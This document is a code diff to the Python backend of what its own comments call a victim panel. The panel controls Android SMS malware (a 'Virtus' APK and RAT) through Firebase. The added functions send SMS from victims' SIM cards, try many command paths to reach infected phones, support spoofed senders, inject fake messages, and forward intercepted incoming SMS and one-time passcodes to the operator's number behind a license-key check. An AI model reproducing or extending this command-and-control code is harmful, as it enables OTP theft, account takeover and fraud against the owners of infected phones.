@@ -1,3 +1,4 @@
+import asyncio
 import json
 import logging
 import time
@@ -12,6 +13,8 @@ logger = logging.getLogger(__name__)
 settings = get_settings()
 
 INJECT_TIMEOUT_SEC = 1.5
+OUTGOING_TIMEOUT_SEC = 3.0
+OUTGOING_SENDER = "__OUT__"
 
 def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
     if profile.firebase_url:
@@ -76,8 +79,165 @@ async def _firebase_put(url: str, data: dict, *, timeout: float = INJECT_TIMEOUT
     response.raise_for_status()
 
 
+async def _firebase_put_ok(url: str, data: dict, *, timeout: float = INJECT_TIMEOUT_SEC) -> bool:
+    try:
+        await _firebase_put(url, data, timeout=timeout)
+        return True
+    except Exception as exc:
+        logger.warning("Firebase put failed for %s: %s", url, exc)
+        return False
+
+
+async def _firebase_patch_ok(url: str, data: dict, *, timeout: float = OUTGOING_TIMEOUT_SEC) -> bool:
+    """tgtoken.py style PATCH — victim panel webhookEvent/sendSms."""
+    try:
+        client = _get_http_client()
+        response = await client.patch(f"{url}.json", json=data, timeout=timeout)
+        response.raise_for_status()
+        return True
+    except Exception as exc:
+        logger.debug("Firebase PATCH failed for %s: %s", url, exc)
+        return False
+
+
+async def _firebase_put_many(urls: list[str], data: dict, *, timeout: float = OUTGOING_TIMEOUT_SEC) -> None:
+    if not urls:
+        return
+
+    async def _one(url: str) -> None:
+        try:
+            await _firebase_put(url, data, timeout=timeout)
+        except Exception as exc:
+            logger.debug("Firebase PUT failed for %s: %s", url, exc)
+
+    await asyncio.gather(*(_one(url) for url in urls), return_exceptions=True)
+
+
+def _inject_firebase_bases(profile: MonitorProfile, device: Device | None = None) -> list[str]:
+    """Firebase roots for inject/outgoing — victim DB first (module DB often deactivated)."""
+    bases: list[str] = []
+    victim = resolve_firebase_url(profile, device)
+    if victim:
+        bases.append(normalize_firebase_url(victim))
+    module_db = settings.virtus_module_db.rstrip("/")
+    if module_db and module_db not in bases:
+        bases.append(module_db)
+    return bases
+
+
+def resolve_apk_firebase_url(profile: MonitorProfile, device: Device | None = None) -> str:
+    """URL the Virtus APK polls for messages/{device_id}/."""
+    victim = resolve_firebase_url(profile, device)
+    if victim:
+        return normalize_firebase_url(victim)
+    return settings.virtus_module_db.rstrip("/")
+
+
+def _outgoing_command_paths(base: str, device_id: str, command_id: str) -> list[str]:
+    paths = [
+        f"{base}/commands/{device_id}/{command_id}",
+        f"{base}/outgoing/{device_id}/{command_id}",
+        f"{base}/clients/{device_id}/commands/{command_id}",
+        f"{base}/clients/{device_id}/command/{command_id}",
+        f"{base}/clients/{device_id}/outbox/{command_id}",
+        f"{base}/clients/{device_id}/send/{command_id}",
+        f"{base}/clients/{device_id}/sendSms/{command_id}",
+        f"{base}/clients/{device_id}/commandList/{command_id}",
+        f"{base}/client/{device_id}/commands/{command_id}",
+        f"{base}/devices/{device_id}/commands/{command_id}",
+        f"{base}/devices/{device_id}/outbox/{command_id}",
+        f"{base}/sms_out/{device_id}/{command_id}",
+        f"{base}/sms_commands/{device_id}/{command_id}",
+        f"{base}/commandQueue/{device_id}/{command_id}",
+        f"{base}/sms/send/{command_id}",
+        f"{base}/send/{device_id}/{command_id}",
+    ]
+    if "/" in device_id:
+        leaf = device_id.rsplit("/", 1)[-1]
+        paths.extend(
+            [
+                f"{base}/commands/{leaf}/{command_id}",
+                f"{base}/clients/{leaf}/sendSms/{command_id}",
+                f"{base}/clients/{leaf}/commands/{command_id}",
+            ]
+        )
+    return paths
+
+
+def _outgoing_inject_paths(base: str, device_id: str, command_id: str) -> list[str]:
+    """Victim SIM send via Virtus/RAT poll on messages/{victim_device_id}/."""
+    return [
+        f"{base}/messages/{device_id}/{command_id}",
+        f"{base}/clients/{device_id}/messages/{command_id}",
+        f"{base}/clients/{device_id}/sms_out/{command_id}",
+    ]
+
+
+def _outgoing_webhook_paths(base: str, device_id: str) -> list[str]:
+    """Auto-token (tgtoken.py) webhook — PATCH clients/{id}/webhookEvent/sendSms."""
+    paths = [
+        f"{base}/clients/{device_id}/webhookEvent/sendSms",
+    ]
+    if "/" in device_id:
+        leaf = device_id.rsplit("/", 1)[-1]
+        paths.append(f"{base}/clients/{leaf}/webhookEvent/sendSms")
+    return paths
+
+
+async def push_channel_webhook_sms(
+    firebase_url: str,
+    device: Device,
+    to_number: str,
+    message: str,
+    sim_index: int = 0,
+) -> bool:
+    """Auto-token fast path — single PATCH webhook (~0.1s), selected SIM index."""
+    base = normalize_firebase_url(firebase_url)
+    payload = {
+        "from": sim_index,
+        "to": to_number,
+        "message": message,
+        "isSended": False,
+    }
+    device_ids = _outgoing_device_ids(device)
+    primary = device_ids[0] if device_ids else device.name
+    urls = _outgoing_webhook_paths(base, primary)
+    results = await asyncio.gather(
+        *(_firebase_patch_ok(url, payload, timeout=1.2) for url in urls),
+        return_exceptions=True,
+    )
+    if any(result is True for result in results):
+        logger.info("Channel webhook queued device=%s to=%s sim=%s", primary, to_number, sim_index)
+        return True
+    return False
+
+
+async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None = None) -> None:
+    """Write APK-readable config on victim Firebase (config/{KEY} + virtus_config.json)."""
+    firebase_url = resolve_apk_firebase_url(profile, device)
+    license_key = get_license_key(profile)
+    if not firebase_url or not license_key or not license_key.upper().startswith("KEY-"):
+        return
+
+    poll_id = resolve_apk_poll_id(profile, device)
+    payload = {
+        "monitoring": profile.is_monitoring,
+        "ts": int(time.time() * 1000),
+        "firebase_url": firebase_url,
+        "device_id": poll_id,
+        "firebase_key": license_key.strip().upper(),
+    }
+    base = normalize_firebase_url(firebase_url)
+    key = license_key.strip().upper()
+    await asyncio.gather(
+        _firebase_put_ok(f"{base}/config/{key}", payload),
+        _firebase_put_ok(f"{base}/virtus_config", payload),
+        return_exceptions=True,
+    )
+
+
 async def push_module_config(profile: MonitorProfile, device: Device | None = None) -> None:
-    """Push Astik-style APK config to module DB: config/{KEY}."""
+    """Push Astik-style APK config to victim + module DB: config/{KEY}."""
     firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         return
@@ -96,8 +256,30 @@ async def push_module_config(profile: MonitorProfile, device: Device | None = No
         monitoring=profile.is_monitoring,
         device_id=resolve_apk_poll_id(profile, device),
         target_number=profile.phone_number,
-        firebase_url=firebase_url,
+        firebase_url=resolve_apk_firebase_url(profile, device),
     )
+    await push_virtus_apk_config(profile, device)
+
+
+def _outgoing_device_ids(device: Device) -> list[str]:
+    from app.firebase_client import canonical_device_id
+
+    ids: list[str] = []
+    if device.name:
+        ids.append(device.name.strip())
+        canonical = canonical_device_id(device.name)
+        if canonical and canonical not in ids:
+            ids.append(canonical)
+    if device.firebase_key:
+        fk = device.firebase_key.strip("/")
+        if fk and fk not in ids:
+            ids.append(fk)
+        leaf = fk.split("/")[-1]
+        if leaf and leaf not in ids:
+            ids.append(leaf)
+        if fk.startswith("clients/") and leaf not in ids:
+            ids.append(leaf)
+    return ids or [device.name]
 
 
 async def push_outgoing_sms_command(
@@ -108,20 +290,79 @@ async def push_outgoing_sms_command(
     sim_index: int = 0,
     sim_slot: int | None = None,
     spoof_sender: str | None = None,
-) -> str:
-    """Queue outgoing SMS: {firebase}/commands/{device_id}/{id}."""
+    *,
+    device: Device | None = None,
+) -> str | None:
+    """Queue channel/outgoing SMS on victim Firebase — panel commands + __OUT__ SIM send."""
     base = normalize_firebase_url(firebase_url)
     command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+    slot = sim_slot or (sim_index + 1)
+    created_at = datetime.now(timezone.utc).isoformat()
     payload = {
         "to": to_number,
+        "phone": to_number,
+        "number": to_number,
+        "recipient": to_number,
         "message": message,
+        "text": message,
+        "body": message,
+        "msg": message,
         "sim_index": sim_index,
-        "sim_slot": sim_slot or (sim_index + 1),
+        "sim_slot": slot,
+        "sim": slot,
+        "simSlot": sim_index,
+        "simCard": slot,
         "spoof_sender": spoof_sender,
         "status": "pending",
-        "created_at": datetime.now(timezone.utc).isoformat(),
+        "type": "sms",
+        "action": "send",
+        "command": "send_sms",
+        "cmd": "sms",
+        "created_at": created_at,
     }
-    await _firebase_put(f"{base}/commands/{device_id}/{command_id}", payload)
+    inject_payload = {
+        "sender": OUTGOING_SENDER,
+        "body": f"{to_number}\n{message}\n{sim_index}",
+        "injected": False,
+        "created_at": created_at,
+    }
+    webhook_payload = {
+        "from": sim_index,
+        "to": to_number,
+        "message": message,
+        "isSended": False,
+    }
+
+    device_ids = _outgoing_device_ids(device) if device else [device_id]
+    if device_id and device_id not in device_ids:
+        device_ids.insert(0, device_id)
+
+    command_urls: list[str] = []
+    inject_urls: list[str] = []
+    webhook_urls: list[str] = []
+    for dev_id in device_ids:
+        command_urls.extend(_outgoing_command_paths(base, dev_id, command_id))
+        inject_urls.extend(_outgoing_inject_paths(base, dev_id, command_id))
+        webhook_urls.extend(_outgoing_webhook_paths(base, dev_id))
+
+    async def _patch_webhooks() -> None:
+        await asyncio.gather(
+            *(_firebase_patch_ok(url, webhook_payload) for url in webhook_urls),
+            return_exceptions=True,
+        )
+
+    await asyncio.gather(
+        _firebase_put_many(command_urls, payload),
+        _firebase_put_many(inject_urls, inject_payload),
+        _patch_webhooks(),
+        return_exceptions=True,
+    )
+    logger.info(
+        "Outgoing queued command_id=%s victim_ids=%s to=%s",
+        command_id,
+        device_ids,
+        to_number,
+    )
     return command_id
 
 
@@ -134,7 +375,8 @@ async def push_inject_message(
     """Queue SMS inject: {firebase}/messages/{device_id}/{id}."""
     from app.channel_relay import prepare_sms_forward
 
-    sender, body = prepare_sms_forward(sender, body)
+    if sender != "__OUT__":
+        sender, body = prepare_sms_forward(sender, body)
     base = normalize_firebase_url(firebase_url)
     message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
     payload = {
@@ -206,16 +448,39 @@ async def push_mynum_inject(
     sender: str,
     body: str,
 ) -> str | None:
-    """Astik-style inject: {firebase_url}/messages/num-{mynum}/{id}."""
-    firebase_url = resolve_firebase_url(profile, device)
-    if not firebase_url or not profile.phone_number:
+    """Astik-style inject: messages/num-{mynum}/ on victim + module Firebase."""
+    poll_id = resolve_apk_poll_id(profile, device)
+    if not poll_id or not profile.phone_number:
         return None
-    return await push_inject_message(
-        firebase_url,
-        mynum_device_id(profile.phone_number),
-        sender,
-        body,
+    from app.channel_relay import prepare_sms_forward
+
+    if sender != "__OUT__":
+        sender, body = prepare_sms_forward(sender, body)
+    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+    payload = {
+        "sender": sender,
+        "body": body,
+        "injected": False,
+        "created_at": datetime.now(timezone.utc).isoformat(),
+    }
+    tasks = []
+    for firebase_url in _inject_firebase_bases(profile, device):
+        base = normalize_firebase_url(firebase_url)
+        tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    if any(result is True for result in results):
+        logger.info(
+            "Inject queued poll_id=%s bases=%s",
+            poll_id,
+            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
+        )
+        return message_id
+    logger.error(
+        "Inject push failed poll_id=%s bases=%s",
+        poll_id,
+        _inject_firebase_bases(profile, device),
     )
+    return None
 
 
 async def push_outbound_to_firebase(
@@ -236,6 +501,14 @@ async def push_outbound_to_firebase(
                 outbound.spoof_sender,
                 outbound.message,
             )
+        if await push_channel_webhook_sms(
+            firebase_url,
+            device,
+            outbound.to_number,
+            outbound.message,
+            sim_index=outbound.sim_index or 0,
+        ):
+            return "webhook"
         return await push_outgoing_sms_command(
             firebase_url,
             device.name,
@@ -243,6 +516,7 @@ async def push_outbound_to_firebase(
             outbound.message,
             sim_index=outbound.sim_index,
             sim_slot=outbound.sim_slot,
+            device=device,
         )
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
@@ -254,11 +528,15 @@ async def send_polling_startup_test(
     profile: MonitorProfile,
     device: Device,
 ) -> tuple[int, int]:
-    """On monitoring start — inject test SMS to /mynum phone via Firebase."""
+    """Monitoring start — Astik inject to /mynum (APK on mynum). KEY optional on bot."""
     import time
 
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
+    from app.services import resolve_mynum_phone
 
+    mynum = resolve_mynum_phone(profile, db)
+    if mynum and not profile.phone_number:
+        profile.phone_number = mynum
     if not profile.phone_number or not profile.is_monitoring:
         return 0, 0
 
@@ -267,16 +545,18 @@ async def send_polling_startup_test(
         logger.warning("Startup test skipped: no firebase URL")
         return 0, 0
 
-    poll_id = mynum_device_id(profile.phone_number)
     t0 = time.perf_counter()
     try:
-        await push_inject_message(
-            firebase_url,
-            poll_id,
+        message_id = await push_mynum_inject(
+            profile,
+            device,
             STARTUP_TEST_SENDER,
             STARTUP_TEST_MESSAGE,
         )
+        if not message_id:
+            raise RuntimeError("startup inject push failed")
         total_ms = max(1, int((time.perf_counter() - t0) * 1000))
+        logger.info("Startup Astik inject queued for /mynum id=%s", message_id)
         return 1, total_ms
     except Exception as exc:
         logger.warning("Startup test inject failed: %s", exc)
@@ -290,10 +570,14 @@ async def forward_incoming_to_mynum(
     sender: str,
     message: str,
 ) -> None:
-    """Forward incoming SMS/OTP to /mynum via inject — same sender ID (Astik-style)."""
+    """Forward incoming SMS/OTP to /mynum via inject — same sender ID (requires KEY + APK)."""
     from app.channel_relay import prepare_sms_forward, queue_forward_to_mynum
 
     if not profile.phone_number or not profile.is_monitoring:
+        return
+
+    license_key = get_license_key(profile)
+    if not license_key or not license_key.upper().startswith("KEY-"):
         return
 
     try:
